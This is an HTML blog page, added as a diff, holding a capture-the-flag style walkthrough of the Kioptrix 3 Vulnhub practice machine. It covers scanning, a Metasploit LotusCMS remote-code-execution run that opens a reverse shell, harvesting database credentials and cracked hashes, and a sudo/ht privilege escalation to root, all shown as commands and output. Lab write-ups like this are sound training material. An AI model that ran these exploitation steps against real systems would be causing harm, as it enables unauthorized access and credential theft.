@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Kioptrix 3 - Writeup</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Kioptrix 3 - Writeup</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/vulnhub/2018-07-18-vulnhub_kioptrix_3_writeups/">Kioptrix 3 - Writeup</a></h4>
+    <h5>July 18, 2018</h5>
+    
+    <a href="https://0x23b.github.io/tags/vulnhub"><kbd class="item-tag">Vulnhub</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="kioptrix-3-writeup">Kioptrix 3 - Writeup</h1>
+
+<h2 id="summary">Summary</h2>
+
+<p>An easy machine, which can be exploited with a remote code execution vulnerability. While on the machine, we can gather logon credentials from the database, which can be used for ssh login. Privilege escalation can be done with executing a command with sudo.</p>
+
+<h2 id="netdiscover">Netdiscover</h2>
+
+<p>First of all, lets find the ip address of the vulnerable machine:</p>
+
+<pre><code class="language-bash">root@kali:~# netdiscover
+Currently scanning: 192.168.60.0/16   |   Screen View: Unique Hosts
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.56.1    0a:00:27:00:00:04      1      60  Unknown vendor              
+ 192.168.56.11   08:00:27:5f:6f:ed      1      60  PCS Systemtechnik GmbH      
+ 192.168.56.12   08:00:27:40:1a:b5      1      60  PCS Systemtechnik GmbH      
+</code></pre>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>Now let&rsquo;s scan for open ports:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/kioptrix3# nmap -sC -sV -oA nmap 192.168.56.12
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-16 13:38 EDT
+Nmap scan report for 192.168.56.12
+Host is up (0.0017s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey:
+|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
+|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Ligoat Security - Got Goat? Security ...
+MAC Address: 08:00:27:40:1A:B5 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.12 seconds
+</code></pre>
+
+<h2 id="searching-for-exploits">Searching for exploits</h2>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/kioptrix3# searchsploit lotuscms
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                                                                                            |  Path
+                                                                                                                                                                          | (/usr/share/exploitdb/)
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                                                                                                             | exploits/php/remote/18565.rb
+</code></pre>
+
+<h2 id="exploit-execution">Exploit execution</h2>
+
+<p>After finding the proper exploit, we have to setup metasploit:</p>
+
+<pre><code class="language-bash">msf exploit(multi/http/lcms_php_exec) &gt; options
+
+Module options (exploit/multi/http/lcms_php_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                     yes       The target address
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   URI      /lcms/           yes       URI
+   VHOST                     no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic LotusCMS 3.0
+
+msf exploit(multi/http/lcms_php_exec) &gt; set rhost kioptrix3.com
+rhost =&gt; kioptrix3.com
+msf exploit(multi/http/lcms_php_exec) &gt; set uri /
+uri =&gt; /
+</code></pre>
+
+<p>And run the exploit:</p>
+
+<pre><code class="language-bash">msf exploit(multi/http/lcms_php_exec) &gt; run
+
+[*] Started reverse TCP handler on 192.168.56.13:4444
+[*] Using found page param: /index.php?page=index
+[*] Signature: QNUaisLfjqmEFyo
+[*] Sending exploit ...
+[*] Sending stage (37775 bytes) to 192.168.56.12
+[*] Meterpreter session 1 opened (192.168.56.13:4444 -&gt; 192.168.56.12:53361) at 2018-07-16 13:59:28 -0400
+msf exploit(multi/http/lcms_php_exec) &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; shell
+Process 4320 created.
+Channel 5 created.
+python -c &quot;import pty; pty.spawn('/bin/bash')&quot;
+www-data@Kioptrix3:/var/www$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+<p>Now we are logged in as www-data and have to escalate privileges. We poke around within the system and find an interesting file with mysql credentials:</p>
+
+<pre><code class="language-bash">www-data@Kioptrix3:/home/www/kioptrix3.com/gallery$ cat gconfig.php
+&lt;?php
+...
+    $GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;
+    $GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;
+    $GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;
+    $GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;
+...
+</code></pre>
+
+<p>As we have user and password, we can try to connect to mysql:</p>
+
+<pre><code class="language-bash">www-data@Kioptrix3:/home/www/kioptrix3.com/gallery$ mysql -u root -p
+mysql -u root -p
+Enter password: fuckeyou
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 48
+Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
+
+Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+
+mysql&gt; show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| gallery            |
+| mysql              |
++--------------------+
+3 rows in set (0.00 sec)
+
+mysql&gt; use gallery;
+use gallery;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
+show tables;
++----------------------+
+| Tables_in_gallery    |
++----------------------+
+| dev_accounts         |
+| gallarific_comments  |
+| gallarific_galleries |
+| gallarific_photos    |
+| gallarific_settings  |
+| gallarific_stats     |
+| gallarific_users     |
++----------------------+
+7 rows in set (0.00 sec)
+
+mysql&gt; select * from dev_accounts;
+select * from dev_accounts;
++----+------------+----------------------------------+
+| id | username   | password                         |
++----+------------+----------------------------------+
+|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
+|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
++----+------------+----------------------------------+
+</code></pre>
+
+<p>After a quick lookup, we see following credentials:</p>
+
+<pre><code class="language-bash">dreg : Mast3r
+loneferret : starwars
+</code></pre>
+
+<p>We can now try to login with one of those users:</p>
+
+<pre><code class="language-bash">www-data@Kioptrix3:/bin$ ssh loneferret@localhost
+ssh loneferret@localhost
+Could not create directory '/var/www/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+RSA key fingerprint is 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd.
+Are you sure you want to continue connecting (yes/no)? yes
+yes
+Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
+loneferret@localhost's password: starwars
+
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
+loneferret@Kioptrix3:~$ id
+id
+uid=1000(loneferret) gid=100(users) groups=100(users)
+</code></pre>
+
+<p>From sudo -l we see, that we are allowed to execute ht as sudo.
+We do so, open /etc/sudoers and edit the entry for loneferret in the following manner:</p>
+
+<pre><code class="language-bash">loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht, /bin/bash
+</code></pre>
+
+<p>Now we can sudo /bin/bash and become root:</p>
+
+<pre><code class="language-bash">loneferret@Kioptrix3:~$ sudo /bin/bash
+root@Kioptrix3:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Kioptrix3:/root# cat Congrats.txt
+cat Congrats.txt
+Good for you for getting here.
+Regardless of the matter (staying within the spirit of the game of course)
+you got here, congratulations are in order. Wasn't that bad now was it.
+
+Went in a different direction with this VM. Exploit based challenges are
+nice. Helps workout that information gathering part, but sometimes we
+need to get our hands dirty in other things as well.
+Again, these VMs are beginner and not intented for everyone.
+Difficulty is relative, keep that in mind.
+
+The object is to learn, do some research and have a little (legal)
+fun in the process.
+
+
+I hope you enjoyed this third challenge.
+
+Steven McElrea
+aka loneferret
+http://www.kioptrix.com
+
+
+Credit needs to be given to the creators of the gallery webapp and CMS used
+for the building of the Kioptrix VM3 site.
+
+Main page CMS:
+http://www.lotuscms.org
+
+Gallery application:
+Gallarific 2.1 - Free Version released October 10, 2009
+http://www.gallarific.com
+Vulnerable version of this application can be downloaded
+from the Exploit-DB website:
+http://www.exploit-db.com/exploits/15891/
+
+The HT Editor can be found here:
+http://hte.sourceforge.net/downloads.html
+And the vulnerable version on Exploit-DB here:
+http://www.exploit-db.com/exploits/17083/
+
+
+Also, all pictures were taken from Google Images, so being part of the
+public domain I used them.
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
